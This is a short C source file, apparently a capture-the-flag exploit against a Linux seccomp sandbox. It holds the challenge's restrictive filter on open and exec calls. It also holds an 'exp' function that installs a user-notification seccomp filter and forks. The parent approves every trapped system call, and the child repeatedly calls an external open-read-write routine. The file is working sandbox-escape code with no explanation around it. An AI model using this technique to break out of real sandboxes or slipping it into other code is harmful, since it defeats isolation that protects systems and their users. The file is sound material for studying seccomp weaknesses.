#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdarg.h>
#include <stddef.h>
#include <string.h>
#include <sys/ioctl.h>
#include <linux/prctl.h>
#include <linux/audit.h>
#include <sys/syscall.h>
#include <linux/filter.h>
#include <linux/seccomp.h>


static __inline long syscall6(long n, long a1, long a2, long a3, long a4, long a5, long a6)
{
  unsigned long ret;
  register long r10 __asm__("r10") = a4;
  register long r8  __asm__("r8")  = a5;
  register long r9  __asm__("r9")  = a6;
  __asm__ __volatile__ ("syscall" : "=a"(ret) : "a"(n), "D"(a1), "S"(a2),
              "d"(a3), "r"(r10), "r"(r8), "r"(r9) : "rcx", "r11", "memory");
  return ret;
}

static __inline void zero(unsigned char *s, size_t n) {
  while (n--) *s++ = 0;
}

extern void orw();
void challenge_setting () {
  // challenge setting
  struct sock_filter strict_filter[] = {
    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_open, 0, 1),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRACE),
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_openat, 0, 1),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRACE),
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execve, 0, 1),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRACE),
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execveat, 0, 1),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRACE),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
  };

  struct sock_fprog prog = {
    .len = sizeof(strict_filter) / sizeof(strict_filter[0]),
    .filter = strict_filter,
  };

  syscall6(__NR_prctl, PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0, 0);
  syscall6(__NR_seccomp, SECCOMP_SET_MODE_FILTER, 0, &prog, 0, 0, 0);
}

int exp() {

  // challenge_setting();

  // exploit starts here
  struct sock_filter exp_filter[] = {
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, offsetof(struct seccomp_data, arch)),
    BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, AUDIT_ARCH_X86_64, 1, 0),
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_USER_NOTIF),
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),
  };

  struct sock_fprog exp_prog = {
    .len = sizeof(exp_filter) / sizeof(exp_filter[0]),
    .filter = exp_filter,
  };
  int fd = syscall6(317, SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_NEW_LISTENER, &exp_prog, 0, 0, 0);


  int pid = syscall6(__NR_fork, 0, 0, 0, 0, 0, 0);
  if(pid)
  {
    struct seccomp_notif req;
    struct seccomp_notif_resp resp;
  
    while(1) {
      zero(&req, sizeof(struct seccomp_notif));
      zero(&resp, sizeof(struct seccomp_notif_resp));
      syscall6(__NR_ioctl,fd, SECCOMP_IOCTL_NOTIF_RECV, &req, 0, 0, 0);
      resp.id = req.id;
      resp.flags = SECCOMP_USER_NOTIF_FLAG_CONTINUE; // allow all the syscalls
      syscall6(__NR_ioctl,fd, SECCOMP_IOCTL_NOTIF_SEND, &resp, 0, 0, 0);
    }
  }
  else if(pid==0){
    while (1) {
      orw();
    }
  }
  return 0;
}